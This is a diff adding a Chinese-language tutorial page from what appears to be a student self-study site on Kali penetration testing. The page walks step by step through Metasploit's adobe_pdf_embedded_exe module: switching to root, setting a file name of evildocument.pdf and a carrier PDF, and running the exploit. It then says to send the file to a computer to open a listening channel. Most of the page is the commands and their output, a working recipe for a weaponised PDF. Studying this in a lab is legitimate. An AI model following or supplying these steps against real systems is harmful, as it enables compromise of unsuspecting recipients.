@@ -1,0 +1,130 @@
+<html>
+<head>
+<title>Kali安全滲透-PDF監聽文件-1</title>
+<link rel="stylesheet" type="text/css" href="kali.css">
+<canvas id="cw"></canvas>
+<script type="text/javascript" src="Mouse_F.js"></script>
+</head>
+<body>
+<div id=main>
+<header>
+	<h1> Kali 安全滲透</h1> 
+</header>
+<aside>
+	<nav>
+	<img src="kali-linux-logo-.jpg" width="170">
+	<ul>
+	<li style="font-size:14pt;"><a href="Kali-home.htm">首頁</a></li>
+	<li style="list-style:circle"><h6>學習操作</h6></li>
+	<li><a href="Kali-passwd.htm">破解密碼</a></li>
+	<li><a href="Kali-disconnection.htm">強制斷線</a></li>
+	<li><a href="Kali-evilPDF.htm">PDF監聽文件-1</a></li>
+	<li><a href="Kali-evilPDF_2.htm">PDF監聽文件-2</a></li>
+	<li><a href="Kali-evilWeb.htm">Web監聽網頁</a></li>
+	<li style="list-style:circle"><h6>前置作業</h6></li>
+	<li><a href="">製作開機USB</a></li>
+	<li><a href="Kali-Group.htm">社群介紹</a></li>
+	</ul>
+	</nav>
+</aside>
+<article>
+	<section class="consection">
+	<h3>PDF監聽文件-1(此分兩章節)</h3>
+<fieldset>
+	<legend style="font-weight:bold; font-size:16pt">本次學習目標</legend>
+	<ul><li>自製監聽文件。-1(此章節)</li>
+使用Metasploit中提供的滲透攻擊模塊-msfconsole，這個模塊不只可以創建PDF監聽檔、同時可滲透MySQL等。
+最終產出：一個監聽文件(.pdf檔)、一個接收文件(.pdf檔)。
+<li>仿造駭客發送方式，觀賞一下駭客模板。-2</li>
+最終產出：一個監聽文件(.pdf檔)。
+</ul>
+	</br>
+	</br>
+	課程寓意：了解監聽文件只需要幾個簡單的操作即可製作出來、效仿駭客傳送監聽文件的方式，順便嘲笑駭客模板(大誤)</br>
+</fieldset>
+</section>
+	<p style="text-align:center;">*有標示顏色者為系統輸出</p>
+	<p>一樣首先我們要先更變管理員權限</p>
+	<p class="code" style="color:#52008F	">01 ──(kali㉿kali)-[~]</p>
+	<p class="code">02 └─$ id kali </p>
+	<p style="text-indent: 4em">確認當前權限</p>
+	<p class="code">   uid=1000(kali) gid=1000(kali) groups=1000(kali), 4(adm), 20(dialout), 24(cdrom), 25(floppy), 27(sudo), 29(audio), 30(dip), 44(video), 46(plugdev), 109(netdev), 121(wireshark), 126(bluetooth), 138(scanner), 146(kaboxer)</p>
+	<p style="text-indent: 4em">前面的uid=1000，表示現在為普通用戶，需更改權限到root</p>
+	<p class="code" style="color:#52008F	">03 ──(kali㉿kali)-[~]</p>
+	<p class="code">04 └─$ sudo passwd root </p>
+	<p style="text-indent: 4em">設定密碼</p>
+	<p class="code">   New password: </p>
+	<p class="code">   Retype new password: </p>
+	<p class="code">   passwd: password updated successfully</p>
+	<p class="code" style="color:#52008F	">05 ──(kali㉿kali)-[~]</p>
+	<p class="code">06 └─$ su root </p>
+	<p class="code">   Password:</p>
+	<p class="code" style="color:#B80000">07 ┌──(root㉿kali)-[/home/kali]</p>
+	<p style="text-indent: 4em">看到第7行呈現root㉿kali即成功更變權限</p>
+	<img class="style_Pic" src="Pic/2-1.png" width="780" >
+<hr/>
+	<p>我們將使用Metasploit中提供的滲透攻擊模塊-msfconsole，來製作一個攻擊文件，並透過傳遞攻擊文件到達對目標系統進行滲透攻擊。</p>
+	<p>開啟msfconsole工具</p>
+	<p class="code">08 └─# msfconsole</p>
+	<img class="style_Pic" src="Pic/4-1.png" width="440" >
+	<img class="style_Pic" src="Pic/4-2.png" width="440" >
+	<ul><li style="list-style:circle" >圖4.1&4.2 會看到類似上兩圖的輸出</li></ul>
+<hr/>
+	<p>在msfconsole中尋找能製作PDF監聽文件的模組</p>
+	<p class="code" style="color:#B80000">09 msf6 > </p>
+	<p class="code" >10 search pdf</p>
+	<p class="code" style="color:#B80000">11 msf6 > </p>
+	<img class="style_Pic" src="Pic/4-3.png" width="1000" >
+	<ul><li style="list-style:circle" >圖4.3 會看到類似上圖的輸出。列出可用且與PDF相關的模組</li></ul>
+	<p>先看下圖，我們需要這個第15行adobe_pdf模組來生成監聽文件
+	<p class="code">12 use exploit/windows/fileformat/adobe_pdf_embedded_exe   </p>
+	<img class="style_Pic" src="Pic/4-4.png" width="1000" >
+	<ul><li style="list-style:circle" >圖4.4 第15行監聽文件模組</li></ul>
+	<p style="text-indent: 4em">成功使用adobe_PDF模組</p>
+	<hr/>
+	<p class="code" style="color:#B80000">13 msf6 exploit(windows/fileformat/adobe_pdf_embedded_exe) > </p>
+	<p class="code">14 # show options</p>
+	<img class="style_Pic" src="Pic/4-5.png" width="1000" >
+	<ul><li style="list-style:circle" >圖4.5 顯示如果要建置監聽文件所需的設定</li></ul>
+	<p>Required上如果寫yes就表示一定要設定</p>
+	<p>因為我想設置我監聽文件的名稱，所以我有多打設置FILENAME的程式碼(以免不清楚預設的文件名稱搞錯文件或誤觸，但誤觸其實也不太會怎麼樣...)</p>
+	<p class="code" style="color:#B80000">15 msf6 exploit(windows/fileformat/adobe_pdf_embedded_exe) > </p>
+	<p class="code">16 set FILENAME evildocument.pdf </p>
+	<p class="code" style="text-indent: 3em">FILENAME => evildocument.pdf</p>
+	<p>看到上面這行後面寫著你想設定的名稱即代表設定成功</p>
+<hr/>
+	<p>接下來要設置接收文件的位置</p>
+	<p>在這裡我們要先創建一個.pdf檔來用做接收文件</p>
+	<p>先找一個想放置接收文件的地方</p>
+	<p>我想要將其放在Hi這個USB裡(下圖會看到一個已經建立好的接收文件willie.pdf)</p>
+	<img class="style_Pic" src="Pic/4-6.png" width="700" >
+	<ul><li style="list-style:circle" >圖4.6 預覽我想放置的位置及已經建立好的接收文件</li></ul>
+	<p>如果不知道如何在Kali建立一個.pdf檔，可參考以下步驟：</p>
+	<p style="text-indent: 4em">在目的地按滑鼠右鍵新增空白檔案➙將空白檔案打開➙點擊file➙點擊print(如下圖4.7)➙在"File:"處設置檔案位置並取名➙按下右下角print即完成建立接收檔案</p>
+	<img class="style_Pic" src="Pic/4-7.png" width="700" >
+	<ul><li style="list-style:circle" >圖4.7 print頁面</li></ul>
+	<p>接下來是設置接收文件的位置的程式碼</p>
+	<p class="code" style="color:#B80000">17 msf6 exploit(windows/fileformat/adobe_pdf_embedded_exe) > </p>
+	<p class="code">18 set INFILENAME /media/kali/Hi/willie.pdf</p>
+	<p class="code" style="text-indent: 3em">INFILENAME => /media/kali/Hi/willie.pdf</p>
+	<p>看到上面這行後面寫著你想設定的檔案即代表設定成功</p>
+<hr/>
+	<p>接下來就是產出的部分了</p>
+	<p class="code" style="color:#B80000">19 msf6 exploit(windows/fileformat/adobe_pdf_embedded_exe) ></p>
+	<p class="code">20 exploit</p>
+	<img class="style_Pic" src="Pic/4-8.png" width="700" >
+	<ul><li style="list-style:circle" >圖4.8 接收文件即監聽文件設置成功！</li></ul>
+	<p>在/root/.msf4/local處就能找到監聽文件evildocument.pdf，只要將檔案傳送給想測試的電腦，就能建立監聽管道對測試電腦了解更多了!</p>
+	<img class="style_Pic" src="Pic/4-9.png" width="700" >
+	<ul><li style="list-style:circle" >圖4.9 設置失敗(再從設置接受文件(圖4.6處)那裏確認有無錯誤)</li></ul>
+<hr/>
+	
+<p>本次學習結束</p>	
+<!--中文註解設計-->
+
+	</section>
+</article>
+<footer>最後更新時間:2022/05/29 製作110-2自主學習社群</footer>
+</div>
+</body>
+</html>
